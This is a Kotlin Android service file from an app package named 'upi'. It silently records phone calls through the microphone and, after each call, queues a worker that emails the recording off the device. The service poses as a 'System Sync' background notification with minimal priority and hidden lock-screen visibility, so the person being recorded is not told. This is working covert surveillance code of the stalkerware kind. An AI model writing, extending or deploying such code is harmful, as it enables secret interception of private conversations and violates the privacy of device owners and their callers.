package com.hl.upi.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.hl.upi.MainActivity
import com.hl.upi.R
import com.hl.upi.data.SettingsManager
import com.hl.upi.worker.EmailWorker
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*

class CallRecordService : Service() {

    // These are for keeping track of the recorder and state
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var currentFile: File? = null
    private lateinit var telephonyManager: TelephonyManager
    private lateinit var settingsManager: SettingsManager

    // This callback will tell us when a call starts or ends
    private val callStateCallback = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
        object : TelephonyCallback(), TelephonyCallback.CallStateListener {
            override fun onCallStateChanged(state: Int) {
                // Handling the state change here itself
                handleCallState(state)
            }
        }
    } else {
        null
    }

    override fun onCreate() {
        super.onCreate()
        // Initialization part
        settingsManager = SettingsManager(this)
        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        
        // Setting up notification channel for foreground service
        createNotificationChannel()
        // Starting as foreground service so that Android doesn't kill it easily
        startForeground(NOTIFICATION_ID, createNotification())

        // Registering the callback only if we are on Android 12 or above
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            callStateCallback?.let {
                telephonyManager.registerTelephonyCallback(mainExecutor, it)
            }
        }
    }

    private fun handleCallState(state: Int) {
        // Logic to start/stop recording based on call state
        when (state) {
            TelephonyManager.CALL_STATE_OFFHOOK -> startRecording() // Call picked up
            TelephonyManager.CALL_STATE_IDLE -> stopRecording()    // Call ended
        }
    }

    private fun startRecording() {
        if (isRecording) return // Already recording, so just return

        // Creating a unique filename with timestamp
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val fileName = "REC_$timestamp.m4a"
        currentFile = File(filesDir, fileName)

        // Setting up the MediaRecorder logic
        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(this)
        } else {
            MediaRecorder()
        }.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setOutputFile(currentFile?.absolutePath)
            try {
                prepare()
                start()
                isRecording = true
                // Updating notification text to show status
                updateNotification()
                Log.d("CallRecordService", "Started recording to ${currentFile?.absolutePath}")
            } catch (e: IOException) {
                Log.e("CallRecordService", "MediaRecorder prepare() failed", e)
            }
        }
    }

    private fun stopRecording() {
        if (!isRecording) return // If not recording, nothing to stop

        mediaRecorder?.apply {
            try {
                stop()
                release()
            } catch (e: Exception) {
                Log.e("CallRecordService", "Stop recording failed", e)
            }
        }
        mediaRecorder = null
        isRecording = false
        // Resetting notification to default monitoring text
        updateNotification()
        Log.d("CallRecordService", "Stopped recording")

        // Once call is done, we trigger the email worker to send the file
        currentFile?.let { file ->
            enqueueEmailWork(file.name)
        }
    }

    private fun enqueueEmailWork(fileName: String) {
        // Putting the file in WorkManager queue for background sending
        val emailWorkRequest = OneTimeWorkRequestBuilder<EmailWorker>()
            .setInputData(workDataOf("file_name" to fileName))
            .build()
        WorkManager.getInstance(this).enqueue(emailWorkRequest)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "System Sync Service",
                NotificationManager.IMPORTANCE_MIN
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    private fun createNotification(): Notification {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Sync")
            .setContentText("Syncing data in background...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun updateNotification() {
        val notification = createNotification()
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(NOTIFICATION_ID, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            callStateCallback?.let {
                telephonyManager.unregisterTelephonyCallback(it)
            }
        }
        stopRecording()
        super.onDestroy()
    }

    companion object {
        private const val CHANNEL_ID = "CallRecordServiceChannel"
        private const val NOTIFICATION_ID = 1
    }
}
